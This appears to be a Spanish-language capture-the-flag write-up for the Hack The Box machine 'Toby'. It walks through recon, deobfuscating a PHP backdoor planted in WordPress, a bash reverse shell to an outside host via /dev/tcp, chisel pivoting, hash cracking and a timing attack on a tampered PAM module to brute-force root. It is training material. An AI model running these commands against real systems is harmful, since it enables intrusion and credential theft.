---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Toby               |
| Os                     | Linux              |
| Difficulty             | Insane             |
| Points                 | 0                  |
| IP                     | 10.10.11.121       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Toby/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.121
```

![nmap 1](/assets/images/Toby/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.121 -oG allPorts
```

![nmap2](/assets/images/Toby/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,80,10022,10080 10.10.11.121 -oN targeted
```

![nmap 3.1](/assets/images/Toby/nmap3.1.png)

![nmap 3.2](/assets/images/Toby/nmap3.2.png)

Vemos que existen 2 puertos que dan el servicio de ssh, por lo que significa que se esta virtualizando la maquina

Lo primero que podemos hacer es listar las tecnologias que existen en el navegador con whatweb.

![whatweb](/assets/images/Toby/whatweb.png)

Echandole un vistaso al contenido de la pagina (Podemos usar el plugin Dark reader para tener el contraste oscuro) en el puerto 80, vemos que carga los datos (CTRL+u) de un subdominio llamado wordpress.toby.htb, que procederemos a agregarlo a nuestro /etc/hosts.

Asi que lo siguiente fue usar wpscan para enumerar las vulnerabilidades o pluggins que se puedan explotar.

```s
wpscan -v --disable-tls-checks --url http://wordpress.toby.htb --force --enumerate u,vp
```

![wpscan 1](/assets/images/Toby/wp1.png)

![wpscan 2](/assets/images/Toby/wp2.png)

En principio, hay muchas cosas interesantes que encontro este scan. Pero podemos tambien listar usuarios con una herramienta de metasploit.

```s
searchsploit wordpress user enumeration

#Para visualizar su contenido
searchsploit -x php/webapps/41497.php
```

![searchsploit enumeration](/assets/images/Toby/wp-enumeration.png)

Parece que el exploit revisa en el directorio wp-json/wp/v2/users/, asi que haremos un curl para visualizar su contenido.

```s
curl -s -X GET "http://wordpress.toby.htb/wp-json/wp/v2/users/" | jq
```

![Curl wp users](/assets/images/Toby/curl_wp_usr.png)

Vemos que efectivamente solo existe el usuario Toby en esta maquina. 
Lo siguiente que haremos es enumerar subdominios con gobuster de la siguiente manera:

```s
gobuster vhost -u  http://toby.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

![gobuster](/assets/images/Toby/gobuster.png)

Con wfuzz seria:

```s
wfuzz -c --hc=404,500 --hh=10814 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.toby.htb" http://toby.htb
```

![wfuzz](/assets/images/Toby/wfuzz.png)

Como encontramos un subdominio ahora antes del .toby.htb llamado backup lo agregaremos a nuestro /etc/hosts tambien. Que previo en el nmap, esta integrado en el puerto 10080. Es un servicio de repositorios de git, el cual se puede fuzzear con gobuster de la siguiente manera:

```s
gobuster dir -u http://backup.toby.htb/toby-admin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
```

Nos podemos meter a ver el repositorio de /backup, tambien podemos hacer un git clone, a esta url y se clonara el repositorio.

```s
git clone http://backup.toby.htb/toby-admin/backup
```

Podemos usar ahora la herramienta para detectar malware <a href="https://github.com/scr34m/php-malware-scanner.git">de git</a>

![malware scanned](/assets/images/Toby/malware_scan.png)

Hemos encontrado el malware, la primer respuesta no es algo tan notorio de malware, pero en el otro si, y para filtrar el contenido en esa linea precisa usaremos:

```s
cat /home/rebick/Documents/HtB/Toby/content/backup/wordpress.toby.htb/html/wp-includes/comment.php | awk 'NR==3405' | less > wtf1.php
```

Ahora que tenemos el primer archivo de lo que contiene el malware. Podemos crear un script en bash, para que sustituya esta secuencia de ofuscamiento de la siguiente manera:

```bash
#!bin/bash

for i in $(seq 1 100); do
    sed -i 's/eval/<?php print/' wtf$i.php
    php wtf$i.php > wtf$(($i + 1)).php
done
```

![wft itered](/assets/images/Toby/wtfi.png)

Observamos que en el archivo 80 empieza a dejar de cambiar el tamano del contenido. Asi que procedemos a leerlo y encontramos el siguiente script:

```php
<?php
if($comment_author_email=="help@toby.htb" && $comment_author_url=="http://test.toby.htb/" && substr($comment_content,0,8)=="746f6279"){$a=substr($comment_content,8);
	$host=explode(":",$a)[0];
	$sec=explode(":",$a)[1];
	$d="/usr/bin/wordpress_comment_validate";
	include $d;
	wp_validate_4034a3($host,$sec);
	return new WP_Error('unspecified error');
}
?>
```

Procedemos a ver como funciona, abriremos burpsuite y cyberchef para interpretar lo que esta sucediendo.
Llenamos el form de http://wordpress.toby.htb/2021/07/14/horses/ de la siguiente forma:

![Backdoor Form](/assets/images/Toby/back_form.png)

Nos ponemos en escucha por el puerto 20053
Y recibimos una cadena

![Chain extrana](/assets/images/Toby/extrana_chain.png)

Que si la convertimos desde hexadecimal, nos manda a un xor key

![Chain from hex](/assets/images/Toby/chain_from_hex.png)

Agregandole un XOR al contenido anterior, tenemos:

![XOR chain](/assets/images/Toby/xor_chain.png)

Ahora intentaremos convertir un id para insertarlo en la terminal y ver el resultado, la respuesta fue:

![XOR chain](/assets/images/Toby/xor_chain.png)

Con la ventana del XOR, haremos una bash para conectarnos remotamente:

```s
bash -c 'bash -i >& /dev/tcp/10.10.14.29/4646 0>&1'
```

Hemos obtenido ahora la shell

![www-data](/assets/images/Toby/reverse_shell.png)

Con un hostname -I vemos que nos encontramos en un contenedor

Para hacer una shell iteractiva:

```s
script /dev/null -c bash
```

Ctrl+Z

```s
stty raw -echo; fg
#ENTER
reset xterm

export TERM=xterm
export SHELL=bash
```

Para las filas

```s
#Consulta de tamano
stty size
45  174
#Para definir
stty rows 20 columns 169
```

DOCKER

```s
ps -faux

#Nombres de dominio
hostname

#Lista puertos en hexadecimal
cat proc/net/tcp

dig mysql.toby.htb
```

En este punto vamos a usar una herramienta llamada <a href="https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz">chisel</a> para hacer el port forwarding con el contenedor que tenemos enfrente y esta permitido para usarlo en el OSCP.

Asi que lo primero seria descomprimirlo, luego quitarle peso con upx y abrir nuestro servidor http con python para descargarlo del otro lado. 

Y al final desde el contenedor ejecutamos:

```s
curl http://10.10.14.29/chisel_1.7.7_linux_amd64 > chisel
#Le damos permisos
chmod +x chisel

./chisel client 10.10.14.29:1234 R:socks
```

Del lado de la atacante

```s
./chisel server --reverse -p 1234
```

Una vez establecida la comunicacion, hacemos una modificacion en el archivo /etc/proxychains.conf
Agregamos la siguiente linea:

```s
socks5 127.0.0.1 1080
```

Y ahora configuramos el foxyproxy con socks5, puerto 127.0.0.1 y puerto 1080 para poder llegar a estas maquinas desde el navegador.

![104](/assets/images/Toby/104_access.png)

Tambien podemos intentar romper el cifrado de las contrasenas de la DB que teniamos.

Accedemos a la base de datos con:

```SQL
proxychains mysql -uroot -pOnlyTheBestSecretsGoInShellScripts -h 172.69.0.102

show databases;

show tables;

describe wp_users;

select user_login,user_pass from wp_users;
```

Y ahora con jhon romperemos los hashes por fuerza bruta con la wordlist rockyou

```s
john -w:/usr/share/wordlists/rockyou.txt hashes
```

Ahora mediante fuerza bruta tenemos la contrasena de jack tambien.
Podemos intentar acceder a la maquina del mysql con proxychains a traves del ssh.

Para ver los procesos que se estan ejecutando le pasaremos el pspy de la siguiente forma, ya que no tiene curl, ni wget la maquina:

```s
proxychains scp pspy jack@172.69.0.102:/tmp/pspy
```

Le damos permisos de ejecusion y lo ejecutamos.

Ahora como vemos la vulnerabilidad en el id_rsa que se esta compartiendo. Lo que haremos es:

```s
while [ $? -ne 0 ]; do cat /tmp/*/key 2>/dev/null; done
```

Esto nos arrojara la llave privada para conectarnos por ssh y podremos conectarnos ahora directamente a la maquina.
Ahora en el repositorio de git que se tiene, se puede ver que existe un repo llamado suportsystem-db, el cual nos descargaremos y vemos que usa sqlite. Para conectarnos a este servicio podemos usar en nuestra maquina:

```s
sqlite3 support_system.db

.tables

.schema enc_meta

.schema support_enc

select * from enc_meta;

select * from support_enc;
```

![sqlite tables](/assets/images/Toby/sqlite_tables.png)

![tables info](/assets/images/Toby/tables_info.png)

Una vez tenemos la informacion de las tablas, podemos ahora ver que una de ellas tiene las llaves de desencriptacion de la otra llave. Muestro los resultados de cyberchef a continuacion:

![Message 1 decrypted](/assets/images/Toby/message1_decrypted.png)

![Message 2 decrypted](/assets/images/Toby/message2_decrypt.png)

El mensaje 2 menciona que la autenticacion ha ido lenta desde el ataque que han pasado. Que podria ser un problema del pam.d a nivel de autenticacion, el archivo de este servicio se encuentra en /etc/pam.d/ con un ls -l --full-time, los que tienen 0, es como un uso de packetes pero los que tienen otra candidad de numeros son porque han sido manipulados, echemosle a ojo a un archivo filtrando los comentarios con:

```s
cat common-auth | grep -v "^#"
```

![Funcion mypown](/assets/images/Toby/function_mypown.png)

Hemos encontrado una funcion extrana, que buscaremos la ruta absoluta desde raiz con:

```s
find \-name mypam.so 2>/dev/null
```

El archivo se encuentra en ./usr/lib/x86_64-linux-gnu/security/mypam.so y es un binario compilado de 64 bits para Linux. Que al parecer su funcion es comparar la contrasena que se ingresa, con la del usuario del sistema. Esta es una via potencial para encontrar la contrasena y haremos con python una lista de caracteres para ir iterando las posibles contrasenas.

```python
python3 -c 'import string; print("\n".join(string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation))' > characters.
```

Ahora con bash:

```bash
#!/bin/bash

TIMEFORMAT=%E

password="Ti"

for character in $(cat characters); do
                echo -n "$password$character: "
                time printf "%-10s" $password$character | su root 2>/dev/null
done
```

![First character found](/assets/images/Toby/first_character.png)

La contrasena encontrada fue TihPAQ4pse, asi que ahora hemos ganado acceso.

![Root owned](/assets/images/Toby/root_owned.png)

![Powned](/assets/images/Toby/powned.png)